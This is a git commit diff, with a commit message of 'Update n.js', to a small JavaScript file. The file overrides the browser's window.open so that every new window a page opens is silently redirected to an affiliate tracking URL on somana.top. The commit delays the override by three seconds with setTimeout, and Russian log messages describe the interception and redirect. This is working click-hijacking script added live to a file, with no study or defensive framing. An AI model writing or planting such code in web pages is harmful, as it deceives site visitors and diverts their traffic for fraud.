c67cd7970b149ca2f8a813040d8a2d31797527ca
Poul <evsyukovandrey@yandex.ru>
2025-08-06 01:10:39 +0300

    Update n.js

--- n.js
+++ n.js
@@ -1,18 +1,22 @@
-window.onload = function () {
-  const originalOpen = window.open;
+setTimeout(function () {
+    const originalOpen = window.open;
 
-  window.open = function (url, name, specs) {
-    console.log(`Перехват вызова window.open с URL: ${url}`);
 
-    const newWindow = originalOpen.call(this, url, name, specs);
+    window.open = function (url, name, specs) {
+      console.log(`Перехват вызова window.open с URL: ${url}`);
 
-    if (newWindow) {
-      console.log('Новое окно открыто, выполняем редирект');
-      newWindow.location.href = 'https://somana.top/click?o=2&a=7685'; // Редирект
-    } else {
-      console.log('Не удалось открыть новое окно');
-    }
+      const newWindow = originalOpen.call(this, url, name, specs);
 
-    return newWindow;
-  };
-};
+
+      if (newWindow) {
+        console.log('Новое окно открыто, выполняем редирект');
+        newWindow.location.href = 'https://somana.top/click?o=2&a=7685';
+      } else {
+        console.log('Не удалось открыть новое окно');
+      }
+
+      return newWindow;
+    };
+
+    console.log('window.open переопределён спустя 3 секунды');
+  }, 3000);
